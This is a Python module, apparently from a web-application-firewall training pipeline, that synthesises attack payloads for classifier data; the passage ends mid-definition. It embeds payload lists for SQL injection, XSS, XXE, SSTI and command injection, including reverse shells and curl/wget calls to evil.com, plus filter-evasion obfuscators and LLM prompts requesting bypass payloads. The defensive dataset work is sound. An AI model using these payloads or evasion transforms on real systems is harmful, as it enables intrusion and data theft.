"""
stages/3_data_augmentation/01_attack_synthesis.py
-------------------------------------------------
Module A — The Augmentation Governor + Synthetic Attack Engine

Merges: 01_encoding_mutations, 02_tamper_scripts, 03–06_grammar_*, 07_local_llm_payloads

Architecture:
  - Reads taxonomy_inventory.json → computes per-class gap → only generates what's needed
  - Unified Generator registry: Mutator | Tamper | Grammar/PCFG | LLM (all subclass BaseGenerator)
    (PcfgGenerator samples recursive grammars where defined, else falls back to flat templates)
  - Probabilistic mutation CHAINS: Grammar → Tamper → Encode (not one-shot)
  - Schema-validated output via HttpRecord Pydantic model before Parquet write
  - ThreadPoolExecutor for parallel class generation

Run:
    python stages/3_data_augmentation/01_attack_synthesis.py --config config/pipeline.yaml [--model-path /path/to/model.gguf]
"""

from __future__ import annotations

import argparse
import json
import random
import re
import time
import urllib.parse
import uuid
from abc import ABC, abstractmethod
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

import pyarrow.parquet as pq
from rich.progress import Progress, SpinnerColumn, BarColumn, MofNCompleteColumn, TimeElapsedColumn

from ai_waf_v2.augment.fillers import fill_placeholders, scrub_textbook_hosts
from ai_waf_v2.augment.pcfg import PcfgSampler, load_pcfg_grammars
from ai_waf_v2.data.schema import HttpRecord, records_to_table
from ai_waf_v2.utils.config import load_config
from ai_waf_v2.utils.llm import call_llm
from ai_waf_v2.utils.logging import configure_root, get_logger
from ai_waf_v2.utils.pipeline import require_inputs, check_output
from ai_waf_v2.utils.seed import seed_everything
from ai_waf_v2.utils.timing import StepTimer
from ai_waf_v2.utils.reports import report_path

log = get_logger(__name__)

TARGET_SAMPLES_PER_CLASS = 5_000   # default floor; overridden by pipeline.yaml if present

# ─────────────────────────────────────────────────────────────────────────────
# Grammar definitions  (consolidated from 03–06)
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class AttackGrammar:
    name:      str
    prefixes:  list[str]
    payloads:  list[str]
    suffixes:  list[str]
    params:    list[str]
    endpoints: list[str]
    methods:   list[str] = field(default_factory=lambda: ["GET", "POST"])


GRAMMAR_REGISTRY: dict[str, AttackGrammar] = {
    "sqli": AttackGrammar(
        name="sqli",
        prefixes=["'", '"', "1 OR", "1 AND", "1; ", "1/*", "' OR '1'='1", '" OR "1"="1'],
        payloads=[
            "UNION SELECT NULL", "UNION SELECT NULL,NULL", "UNION SELECT NULL,NULL,NULL",
            "UNION ALL SELECT 1,2,3", "UNION SELECT username,password FROM users",
            "AND 1=1", "AND 1=2", "OR 1=1", "OR SLEEP(5)", "AND SLEEP(5)",
            "WAITFOR DELAY '0:0:5'", "AND BENCHMARK(5000000,MD5(1))",
            "ORDER BY 1--", "ORDER BY 100--", "GROUP BY 1", "HAVING 1=1",
            "AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
            "AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)",
        ],
        suffixes=["--", "-- -", "#", "/*", "/**/", ";--", "' --", '" --', ""],
        params=["id", "user_id", "item_id", "product_id", "order_id", "page",
                "search", "query", "q", "cat", "category", "filter", "sort",
                "offset", "limit", "key", "token", "session", "uid", "pid"],
        endpoints=["/api/v1/users", "/api/v1/products", "/api/v1/orders",
                   "/search", "/products", "/users", "/admin/users",
                   "/api/items", "/api/v2/data", "/shop/product"],
    ),
    "xss": AttackGrammar(
        name="xss",
        prefixes=["<", '"><', "';", "'><", "javascript:", "data:text/html,"],
        payloads=[
            "script>alert(1)</script", "script>alert('XSS')</script",
            "img src=x onerror=alert(1)>", "img src=x onerror=alert(document.cookie)>",
            "svg onload=alert(1)>", "body onload=alert(1)>",
            "iframe src=javascript:alert(1)>", "input autofocus onfocus=alert(1)>",
            "select autofocus onfocus=alert(1)>", "video><source onerror=alert(1)>",
            "a href=javascript:alert(1)>click</a",
            "math><mtext></mtext><script>alert(1)</script>",
            "details open ontoggle=alert(1)>",
            "script src=//evil.com/x.js></script",
        ],
        suffixes=["", ">", "/>", "</div>"],
        params=["name", "comment", "message", "description", "content", "title",
                "subject", "body", "text", "input", "value", "username", "email",
                "search", "q", "redirect", "url"],
        endpoints=["/comment", "/feedback", "/profile", "/search", "/post",
                   "/message", "/signup", "/login", "/api/v1/comments", "/api/v1/messages"],
        methods=["GET", "POST"],
    ),
    "lfi": AttackGrammar(
        name="lfi",
        prefixes=["", "../", "..\\", "....//", "..%2f"],
        payloads=[
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "../../../../etc/shadow", "..%2f..%2fetc%2fpasswd",
            "..%252f..%252fetc%252fpasswd", "..%c0%af..%c0%afetc%c0%afpasswd",
            "/etc/passwd", "/etc/shadow", "/proc/self/environ", "/proc/self/cmdline",
            "/var/log/apache2/access.log", "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        ],
        suffixes=["%00", "", "&", "?"],
        params=["file", "page", "path", "include", "doc", "document",
                "template", "load", "read", "view", "content", "dir"],
        endpoints=["/index.php", "/page.php", "/view.php", "/download.php",
                   "/api/file", "/api/v1/document", "/include", "/template"],
        methods=["GET"],
    ),
    "ssrf": AttackGrammar(
        name="ssrf",
        prefixes=["http://", "https://", "file://", "dict://", "gopher://", "ftp://"],
        payloads=[
            "169.254.169.254/latest/meta-data/", "169.254.169.254/latest/user-data/",
            "169.254.169.254/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
            "localhost/admin", "localhost:8080", "127.0.0.1/admin", "0.0.0.0/admin",
            "127.1/admin", "[::1]/admin", "internal.service.local/api",
            "192.168.1.1", "10.0.0.1", "0177.0.0.1", "2130706433",
        ],
        suffixes=["", "/", "?debug=1"],
        params=["url", "uri", "href", "src", "source", "dest", "destination",
                "redirect", "proxy", "callback", "webhook", "next", "target",
                "load", "fetch", "request"],
        endpoints=["/api/v1/fetch", "/proxy", "/redirect",
                   "/api/webhook", "/api/v1/callback", "/api/url", "/api/external"],
        methods=["GET", "POST"],
    ),
    "cmdi": AttackGrammar(
        name="cmdi",
        prefixes=["; ", "| ", "|| ", "&& ", "`", "$(", "\n"],
        payloads=[
            "id", "whoami", "cat /etc/passwd", "cat /etc/shadow", "ls -la /",
            "uname -a", "ps aux", "env", "ping -c 1 evil.com",
            "curl http://evil.com/x", "wget http://evil.com/x",
            "bash -i >& /dev/tcp/evil.com/4444 0>&1",
            "nc -e /bin/sh evil.com 4444",
            "python3 -c 'import os; os.system(\"id\")'",
        ],
        suffixes=["", " #", " 2>&1", " > /dev/null", " &"],
        params=["cmd", "command", "exec", "run", "ping", "host",
                "ip", "query", "input", "shell", "terminal"],
        endpoints=["/api/ping", "/admin/exec", "/api/command",
                   "/api/v1/run", "/debug/exec", "/api/shell"],
        methods=["GET", "POST"],
    ),
    "path_traversal": AttackGrammar(
        name="path_traversal",
        prefixes=["", "../", "..\\", "....//", "%2e%2e/", "%2e%2e%2f", "..%2f", "..%5c"],
        payloads=[
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "../../../../etc/shadow", "../../../proc/self/environ",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%afetc%c0%afpasswd", "..%e0%80%afetc%e0%80%afpasswd",
            "....//....//etc/passwd", "....\\\\....\\\\etc\\passwd",
        ],
        suffixes=["%00", "%00.php", "", ".txt", "%20"],
        params=["path", "file", "dir", "filename", "filepath", "document", "resource"],
        endpoints=["/download", "/files", "/static", "/assets",
                   "/api/v1/file", "/api/download", "/serve"],
        methods=["GET"],
    ),
    "header_injection": AttackGrammar(
        name="header_injection",
        prefixes=["", "%0d%0a", "%0a", "\r\n", "\n"],
        payloads=[
            "%0d%0aSet-Cookie: session=evil",
            "%0d%0aLocation: https://evil.com",
            "%0d%0aContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
            "\r\nSet-Cookie: admin=true",
            "\r\nX-Forwarded-For: 127.0.0.1",
            "%0aSet-Cookie: role=admin",
            "%0d%0aContent-Length: 0%0d%0aHTTP/1.1 200 OK",
            "\r\nLocation: //evil.com",
            "%0d%0aX-Frame-Options: ALLOWALL",
            "%0d%0aAccess-Control-Allow-Origin: *",
        ],
        suffixes=["", "%0d%0a", "&"],
        params=["redirect", "url", "next", "location", "return", "returnUrl", "callback"],
        endpoints=["/redirect", "/login", "/api/v1/redirect",
                   "/auth/callback", "/oauth/authorize"],
        methods=["GET", "POST"],
    ),
    "xxe": AttackGrammar(
        name="xxe",
        prefixes=[
            '<?xml version="1.0"?>',
            '<?xml version="1.0" encoding="UTF-8"?>',
        ],
        payloads=[
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo/>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo PUBLIC "-//OWASP//DTD//EN" "http://evil.com/evil.dtd"><foo/>',
            '<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?x=%file;\'>"> %eval; %exfil;]><data/>',
        ],
        suffixes=[""],
        params=["data", "xml", "body", "payload", "content"],
        endpoints=["/api/v1/xml", "/api/upload", "/api/parse",
                   "/soap", "/api/v1/data", "/xmlrpc"],
        methods=["POST"],
    ),
    "ssti": AttackGrammar(
        name="ssti",
        prefixes=["", "'", '"', "}}{{"],
        payloads=[
            "{{7*7}}", "{{7*'7'}}", "{{config}}", "{{config.items()}}",
            "${7*7}", "${class.getResource('').getPath()}",
            "#{7*7}", "#{session.getAttribute('admin')}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "<%= 7*7 %>", "<%= system('id') %>",
            "{php}echo(`id`);{/php}",
            "*{7*7}", "@(1+2)",
        ],
        suffixes=["", "}}", "%}", "-->"],
        params=["name", "template", "subject", "greeting", "message", "title", "content"],
        endpoints=["/render", "/template", "/api/v1/render",
                   "/email/preview", "/api/v1/template", "/preview"],
        methods=["GET", "POST"],
    ),
}


# ─────────────────────────────────────────────────────────────────────────────
# Base Generator + concrete implementations
# ─────────────────────────────────────────────────────────────────────────────

class BaseGenerator(ABC):
    """All generator types share this interface so the Governor can treat them uniformly."""

    @abstractmethod
    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        """Return a list of raw payload strings (not wrapped HTTP requests)."""
        ...

    @property
    @abstractmethod
    def name(self) -> str: ...


class GrammarGenerator(BaseGenerator):
    """Samples from a context-free grammar to produce novel payloads."""

    @property
    def name(self) -> str:
        return "grammar"

    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        if attack_class not in GRAMMAR_REGISTRY:
            log.warning(f"GrammarGenerator: no grammar for '{attack_class}'")
            return []
        g = GRAMMAR_REGISTRY[attack_class]
        payloads = []
        for _ in range(n):
            payloads.append(
                f"{rng.choice(g.prefixes)}{rng.choice(g.payloads)}{rng.choice(g.suffixes)}"
            )
        return payloads


class PcfgGenerator(BaseGenerator):
    """
    Recursive-PCFG seed producer — a drop-in for the 'grammar' slot.

    Grammars are loaded from config (``config/pcfg_grammars.yaml``). For any class
    with a grammar it samples novel, structurally-nested payloads via PcfgSampler;
    for every other class it transparently delegates to the flat GrammarGenerator
    templates, which therefore remain the backup whenever no PCFG grammar is
    present. Pass an empty ``registry`` to disable PCFG entirely.
    """

    def __init__(self, registry: dict | None = None):
        self._flat    = GrammarGenerator()   # unchanged flat-template backup
        self._sampler = PcfgSampler(registry or {}, fallback=self._flat.generate_payloads)

    @property
    def name(self) -> str:
        return "grammar"                     # same name → Governor quota unchanged

    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        return self._sampler.generate(attack_class, n, rng)


class EncoderGenerator(BaseGenerator):
    """Applies encoding mutations to payload strings (URL, hex, unicode, case, whitespace)."""

    ENCODINGS: dict[str, Callable[[str, random.Random], str]] = {
        "url_encode":        lambda s, r: urllib.parse.quote(s, safe=""),
        "double_url_encode": lambda s, r: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe=""),
        "partial_url_encode": lambda s, r: "".join(
            urllib.parse.quote(c, safe="") if not c.isalnum() and r.random() < 0.5 else c
            for c in s
        ),
        "hex_encode":        lambda s, r: "".join(
            f"0x{ord(c):02x}" if c.isalpha() else c for c in s
        ),
        "unicode_escape":    lambda s, r: "".join(
            f"\\u{ord(c):04x}" if c.isalpha() else c for c in s
        ),
        "html_entity":       lambda s, r: "".join(
            f"&#{ord(c)};" if c.isalpha() else c for c in s
        ),
        "comment_insertion": lambda s, r: re.sub(r"\s+", "/**/", s),
        "case_variation":    lambda s, r: "".join(
            c.upper() if r.random() > 0.5 else c.lower() for c in s
        ),
        "whitespace_bypass": lambda s, r: re.sub(
            r" ",
            lambda _: r.choice(["\t", "\n", "\r", "  ", "%09", "%0a", "%0d"]),
            s,
        ),
    }

    def __init__(self, seeds: list[str], enabled: list[str] | None = None):
        self.seeds   = seeds
        self.enabled = enabled or list(self.ENCODINGS.keys())

    @property
    def name(self) -> str:
        return "encoder"

    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        if not self.seeds:
            return []
        payloads = []
        for _ in range(n):
            seed    = rng.choice(self.seeds)
            enc_key = rng.choice(self.enabled)
            enc_fn  = self.ENCODINGS[enc_key]
            payloads.append(enc_fn(seed, rng))
        return payloads


# ─── IP-address helpers for SSRF obfuscation ────────────────────────────────

_IPV4_RE = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')


def _ip_to_decimal(s: str) -> str:
    def _conv(m: re.Match) -> str:
        parts = m.group(1).split(".")
        return str(sum(int(p) << (24 - 8 * i) for i, p in enumerate(parts)))
    return _IPV4_RE.sub(_conv, s)


def _ip_to_octal(s: str) -> str:
    def _conv(m: re.Match) -> str:
        return ".".join(oct(int(p)).replace("0o", "0") for p in m.group(1).split("."))
    return _IPV4_RE.sub(_conv, s)


def _ip_to_hex(s: str) -> str:
    def _conv(m: re.Match) -> str:
        return "0x" + "".join(f"{int(p):02x}" for p in m.group(1).split("."))
    return _IPV4_RE.sub(_conv, s)


class ObfuscatorGenerator(BaseGenerator):
    """Applies class-specific syntax obfuscation transforms to seed payloads."""

    OBFUSCATORS: dict[str, dict[str, Callable[[str], str]]] = {
        "sqli": {
            "apostrophe_mask":  lambda s: s.replace("'", "UTF8MB4_UNICODE_CI"),
            "modsecurity_safe": lambda s: s.replace("=", " LIKE ").replace("OR", "||"),
            "between":          lambda s: s.replace("=1", " BETWEEN 0 AND 2"),
            "ifnull2ifisnull":  lambda s: s.replace("IFNULL(", "IF(ISNULL("),
            "multiplespaces":   lambda s: s.replace(" ", "   "),
            "space2dash":       lambda s: s.replace(" ", "--\n"),
            "space2mssqlblank": lambda s: s.replace(" ", "\t"),
        },
        "xss": {
            "tag_case":          lambda s: s.replace("<script", "<Script").replace("<img", "<Img").replace("<svg", "<Svg"),
            "js_comment":        lambda s: s.replace("alert(", "alert/*xss*/("),
            "backtick_exec":     lambda s: s.replace("alert(1)", "alert`1`"),
            "attr_double_encode":lambda s: s.replace("alert", "&#x61;lert"),
            "null_byte_event":   lambda s: s.replace("onerror=", "on\x00error=").replace("onload=", "on\x00load="),
        },
        "lfi": {
            "double_encode": lambda s: s.replace("../", "%252e%252e%252f"),
            "overlong_utf8": lambda s: s.replace("../", "%c0%ae%c0%ae/"),
            "dotdotslash":   lambda s: s.replace("../", "....//"),
            "null_byte":     lambda s: s + "%00",
            "backslash_mix": lambda s: s.replace("../", "..\\"),
        },
        "cmdi": {
            "ifs_space":    lambda s: s.replace(" ", "${IFS}"),
            "brace_expand": lambda s: re.sub(r'\b(cat|ls|id|whoami|uname|wget|curl)\b', r'{\1,}', s),
            "quote_break":  lambda s: re.sub(r'\b([a-z])([a-z]+)\b', r"\1''\2", s, count=1),
            "hex_cmd":      lambda s: s.replace("cat", "$'\\x63\\x61\\x74'").replace("id", "$'\\x69\\x64'"),
        },
        "ssrf": {
            "ip_decimal":      _ip_to_decimal,
            "ip_octal":        _ip_to_octal,
            "ip_hex":          _ip_to_hex,
            "proto_confusion": lambda s: s.replace("http://", "http:///"),
            "ipv6_mapped":     lambda s: s.replace("127.0.0.1", "[::ffff:127.0.0.1]").replace("169.254.169.254", "[::ffff:169.254.169.254]"),
        },
    }

    # Safe second-pass transforms per class: operate on different payload parts
    # than the primary obfuscations so stacking doesn't produce conflicts or no-ops.
    #   lfi  — null_byte appends to suffix; safe after any traversal transform
    #   ssrf — proto_confusion rewrites the scheme; safe after any IP transform
    STACKABLE: dict[str, list[str]] = {
        "lfi":  ["null_byte"],
        "ssrf": ["proto_confusion"],
    }

    def __init__(self, seeds: list[str]):
        self.seeds = seeds

    @property
    def name(self) -> str:
        return "obfuscator"

    def apply_stackable(self, payload: str, attack_class: str, rng: random.Random) -> str:
        """Apply a safe secondary obfuscation for classes with known compatible stacks."""
        names = self.STACKABLE.get(attack_class, [])
        if not names:
            return payload
        fn = self.OBFUSCATORS[attack_class][rng.choice(names)]
        return fn(payload)

    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        if not self.seeds:
            return []
        class_transforms = self.OBFUSCATORS.get(attack_class, {})
        if not class_transforms:
            return []
        transform_fns = list(class_transforms.values())
        payloads      = []
        for _ in range(n):
            seed = rng.choice(self.seeds)
            fn   = rng.choice(transform_fns)
            payloads.append(fn(seed))
        return payloads


def _parse_payload_response(text: str) -> list[str]:
    """
    Parse an LLM response into a list of payload strings.
    Expects a JSON array; falls back to line-by-line parsing if JSON is malformed.
    """
    import json as _json
    # Strip markdown code fences if present
    if text.startswith("```"):
        text = "\n".join(l for l in text.splitlines() if not l.strip().startswith("```"))
    text = text.strip()
    try:
        parsed = _json.loads(text)
        if isinstance(parsed, list):
            return [str(p).strip() for p in parsed if str(p).strip()]
    except (_json.JSONDecodeError, ValueError):
        pass
    # Fallback: one payload per line, strip list prefixes ("1.", "-", "*")
    results = []
    for line in text.splitlines():
        line = line.strip()
        if not line or len(line) <= 3 or line.endswith(":"):
            continue
        # Remove common list prefixes
        for prefix in ("- ", "* ", "• "):
            if line.startswith(prefix):
                line = line[len(prefix):]
                break
        if line and line[0].isdigit() and ". " in line[:4]:
            line = line.split(". ", 1)[1]
        if line:
            results.append(line)
    return results


def _replace_placeholders(payload: str, rng: random.Random) -> str:
    """
    Scrub textbook placeholder hostnames (evil.com, example.com, …) from LLM output,
    replacing them with high-cardinality hosts from the shared filler distribution.

    LLM output does not contain §NAME§ placeholders, so it only needs this scrub;
    grammar output uses placeholders and is handled by fill_placeholders() in the
    Governor. Both draw from ai_waf_v2.augment.fillers, the same source benign
    generation uses, so hostnames stay label-neutral.
    """
    return scrub_textbook_hosts(payload, rng)


class LlmGenerator(BaseGenerator):
    """Generates payloads via a configurable LLM backend (local, Ollama, Anthropic, Google)."""

    SYSTEM = (
        "You are a security dataset generator for WAF classifier training. "
        "Output ONLY a JSON array of payload strings — no markdown, no explanation, no commentary. "
        'Example format: ["payload1", "payload2", "payload3"]\n'
        "Use realistic-looking hostnames, IPs, paths, and parameter values. "
        "Avoid textbook placeholders such as evil.com, example.com, attacker.com, "
        "malicious.com, victim.com, or generic words like 'sensitive', 'secret', 'test'."
    )

    BATCH_SIZE = 10  # payloads requested per model call

    PROMPTS = {
        "sqli": (
            "Generate {n} SQL injection payloads for a WAF training dataset. "
            "Cover blind, error-based, and second-order techniques with keyword-filter evasion. "
            "Output a JSON array of exactly {n} payload strings."
        ),
        "xss": (
            "Generate {n} XSS payloads for a WAF training dataset. "
            "Cover DOM-based, mutation-based, and polyglot variants that bypass CSP. "
            "Output a JSON array of exactly {n} payload strings."
        ),
        "ssrf": (
            "Generate {n} SSRF payloads for a WAF training dataset. "
            "Target cloud metadata endpoints using IP encoding and protocol wrappers. "
            "Output a JSON array of exactly {n} payload strings."
        ),
        "cmdi": (
            "Generate {n} OS command injection payloads for a WAF training dataset. "
            "Use metacharacters, environment variables, and encoding to bypass sanitization. "
            "Output a JSON array of exactly {n} payload strings."
        ),
        "lfi": (
            "Generate {n} LFI payloads for a WAF training dataset. "
            "Use null-byte injection, encoding tricks, and PHP wrappers. "
            "Output a JSON array of exactly {n} payload strings."
        ),
        "path_traversal": (
            "Generate {n} path traversal payloads for a WAF training dataset. "
            "Use Unicode encoding, double encoding, Windows paths, and null bytes to bypass filters. "
            "Output a JSON array of exactly {n} payload strings."
        ),
        "header_injection": (
            "Generate {n} HTTP header injection payloads for a WAF training dataset. "
            "Use CRLF sequences to inject Set-Cookie or Location headers, in both URL-encoded and raw forms. "
            "Output a JSON array of exactly {n} payload strings."
        ),
        "xxe": (
            "Generate {n} XXE payloads for a WAF training dataset. "
            "Each must be a complete XML document with DOCTYPE and ENTITY declarations for local file read or SSRF. "
            "Output a JSON array of exactly {n} payload strings."
        ),
        "ssti": (
            "Generate {n} server-side template injection payloads for a WAF training dataset. "
            "Cover Jinja2, Twig, FreeMarker, and Velocity engines including RCE variants. "
            "Output a JSON array of exactly {n} payload strings."
        ),
    }

    def __init__(
        self,
        provider:         str,
        model:            str   = "",
        model_path:       str   = "",
        ollama_base_url:  str   = "http://localhost:11434",
        max_tokens:       int   = 256,
        temperature:      float = 0.9,
        request_timeout:  int   = 30,
    ):
        self._provider        = provider
        self._model           = model
        self._model_path      = model_path
        self._ollama_base_url = ollama_base_url
        self._max_tokens      = max_tokens
        self._temperature     = temperature
        self._request_timeout = request_timeout

    @property
    def name(self) -> str:
        return "llm"

    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        prompt = self.PROMPTS.get(attack_class)
        if not prompt:
            return []
        MAX_CONSECUTIVE_FAILURES = 5
        payloads: list[str] = []
        consecutive_failures = 0
        while len(payloads) < n:
            batch = min(self.BATCH_SIZE, n - len(payloads))
            log.info(f"[{attack_class}] calling LLM — {len(payloads)}/{n} payloads so far")
            text = call_llm(
                provider         = self._provider,
                system           = self.SYSTEM,
                user             = prompt.format(n=batch),
                model            = self._model,
                max_tokens       = self._max_tokens,
                temperature      = self._temperature,
                model_path       = self._model_path,
                ollama_base_url  = self._ollama_base_url,
                request_timeout  = self._request_timeout,
            )
            if text:
                before  = len(payloads)
                parsed  = _parse_payload_response(text)
                cleaned = [_replace_placeholders(p, rng) for p in parsed]
                payloads.extend(cleaned)
                if len(payloads) > before:
                    consecutive_failures = 0
                    log.info(f"[{attack_class}] {len(payloads)}/{n} payloads collected")
                else:
                    consecutive_failures += 1
                    log.warning(
                        f"[{attack_class}] parse failure: response returned {len(parsed)} item(s) "
                        f"but none were usable ({consecutive_failures}/{MAX_CONSECUTIVE_FAILURES})"
                    )
            else:
                consecutive_failures += 1
                log.warning(
                    f"[{attack_class}] transport failure: call_llm returned None "
                    f"({consecutive_failures}/{MAX_CONSECUTIVE_FAILURES})"
                )
                time.sleep(1.0)

            if consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
                log.warning(
                    f"[{attack_class}] aborting LLM generation after {MAX_CONSECUTIVE_FAILURES} "
                    f"consecutive failures — returning {len(payloads)}/{n} payloads"
                )
                break
        return payloads[:n]


# ─────────────────────────────────────────────────────────────────────────────
# Mutation chain  (the key new capability)
# ─────────────────────────────────────────────────────────────────────────────

def _build_chain(
    payload:              str,
    generators:           list[BaseGenerator],
    chain_len:            int,
    attack_class:         str,
    rng:                  random.Random,
    double_encode_prob:   float = 0.30,
    double_obfuscate_prob: float = 0.30,
) -> str:
    """
    Deterministic transform chain applied to every seed payload:
      1. Obfuscator        — syntax-level, class-specific
      2. Obfuscator again  — stackable second pass with probability `double_obfuscate_prob`
                             (lfi: null_byte suffix; ssrf: proto_confusion scheme rewrite)
      3. Encoder           — encoding-level, always applied
      4. Encoder again     — with probability `double_encode_prob` for double-encoded variants
    """
    obfuscator = next((g for g in generators if g.name == "obfuscator"), None)
    encoder    = next((g for g in generators if g.name == "encoder"),    None)

    result = payload
    if obfuscator:
        result = _apply_to_string(obfuscator, result, attack_class, rng)
        if rng.random() < double_obfuscate_prob:
            result = obfuscator.apply_stackable(result, attack_class, rng)
    if encoder:
        result = _apply_to_string(encoder, result, attack_class, rng)
        if rng.random() < double_encode_prob:
            result = _apply_to_string(encoder, result, attack_class, rng)
    return result


def _apply_to_string(gen: BaseGenerator, payload: str, attack_class: str, rng: random.Random) -> str:
    """Apply a single Encoder/Obfuscator generator to an existing payload string."""
    if isinstance(gen, EncoderGenerator):
        enc_key = rng.choice(gen.enabled)
        return EncoderGenerator.ENCODINGS[enc_key](payload, rng)
    if isinstance(gen, ObfuscatorGenerator):
        class_transforms = ObfuscatorGenerator.OBFUSCATORS.get(attack_class, {})
        if class_transforms:
            fn = rng.choice(list(class_transforms.values()))
            return fn(payload)
    return payload


# ─────────────────────────────────────────────────────────────────────────────
# Governor  —  reads the gap and dispatches generators
# ─────────────────────────────────────────────────────────────────────────────

class AugmentationGovernor:
    """
    Reads taxonomy_inventory.json and determines how many samples to generate
    per class, then orchestrates generators to fill the gap.
    """

    def __init__(
        self,
        inventory_path:        Path,
        target_per_class:      int,
        generators:            list[BaseGenerator],
        chain_len:             int   = 2,
        double_encode_prob:    float = 0.30,
        double_obfuscate_prob: float = 0.30,
        rng_seed:              int   = 42,
        llm_ratio:             float = 0.5,
    ):
        self.target                = target_per_class
        self.generators            = generators
        self.chain_len             = chain_len
        self.double_encode_prob    = double_encode_prob
        self.double_obfuscate_prob = double_obfuscate_prob
        self.rng                   = random.Random(rng_seed)
        self.llm_ratio             = max(0.0, min(1.0, llm_ratio))

        self.class_counts: dict[str, int] = {}
        if inventory_path.exists():
            inv = json.loads(inventory_path.read_text())
            self.class_counts = {
                k: v for k, v in inv.get("class_counts", {}).items()
                if k != "benign"
            }
            log.info(f"Governor loaded inventory: {self.class_counts}")
        else:
            log.warning(f"Inventory not found at {inventory_path}; generating full target for all classes")

    def gaps(self) -> dict[str, int]:
        """Return {attack_class: n_needed} for classes below the target."""
        result = {}
        for cls in GRAMMAR_REGISTRY:
            current = self.class_counts.get(cls, 0)
            needed  = max(0, self.target - current)
            if needed > 0:
                result[cls] = needed
                log.info(f"  Gap: {cls:15s}  current={current:,}  need={needed:,}")
            else:
                log.info(f"  OK:  {cls:15s}  current={current:,}  (at or above target)")
        return result

    def synthesize_class(
        self,
        attack_class: str,
        n_needed:    int,
    ) -> list[tuple[str, str]]:
        """
        Generate `n_needed` payload strings for `attack_class`.

        Returns a list of (payload, generator_name) pairs so callers can
        tag records with their origin (grammar vs llm).

        Seed producers (grammar, llm) generate raw payloads; transform
        generators (encoder, obfuscator) are applied to every seed via
        _build_chain — never used as seed producers themselves.
        """
        seed_gens = [g for g in self.generators if g.name in ("grammar", "llm")]
        if not seed_gens:
            log.warning(f"No seed generators available for '{attack_class}'")
            return []

        has_llm     = any(g.name == "llm"     for g in seed_gens)
        has_grammar = any(g.name == "grammar" for g in seed_gens)
        if has_llm and has_grammar:
            llm_n     = round(n_needed * self.llm_ratio)
            grammar_n = n_needed - llm_n
        elif has_llm:
            llm_n, grammar_n = n_needed, 0
        else:
            llm_n, grammar_n = 0, n_needed
        quota = {"llm": llm_n, "grammar": grammar_n}

        raw_seeds: list[tuple[str, str]] = []  # (payload, generator_name)
        for g in seed_gens:
            n = quota[g.name]
            if n > 0:
                raw_seeds.extend(
                    (p, g.name) for p in g.generate_payloads(attack_class, n, self.rng)
                )

        # Pad with random duplicates if a generator fell short (e.g. LLM failures)
        while len(raw_seeds) < n_needed:
            raw_seeds.append(self.rng.choice(raw_seeds))

        final_payloads = []
        for seed, gen_name in raw_seeds[:n_needed]:
            # Fill §NAME§ filler placeholders with high-cardinality, label-neutral
            # values BEFORE obfuscation (the mutation chain would otherwise mangle
            # the placeholder markers). No-op for seeds without placeholders.
            filled = fill_placeholders(seed, self.rng)
            final_payloads.append((
                _build_chain(filled, self.generators, self.chain_len, attack_class, self.rng,
                             self.double_encode_prob, self.double_obfuscate_prob),
                gen_name,
            ))
        return final_payloads[:n_needed]


# ─────────────────────────────────────────────────────────────────────────────
# HTTP record assembly (raw payload → validated HttpRecord)
# ─────────────────────────────────────────────────────────────────────────────

# Minimal stub headers used during synthesis — method/param/endpoint are
# class-correct but all other metadata is a placeholder replaced by
# 02_request_framing.py which handles realistic header diversity.
_STUB_HEADERS = json.dumps({"Host": "stub.invalid", "User-Agent": "stub"})

_CLASS_META = {
    "sqli":            dict(method="GET",  param="q",        endpoint="/api/v1/search"),
    "xss":             dict(method="POST", param="msg",       endpoint="/api/v1/comment"),
    "ssrf":            dict(method="GET",  param="url",       endpoint="/api/v1/fetch"),
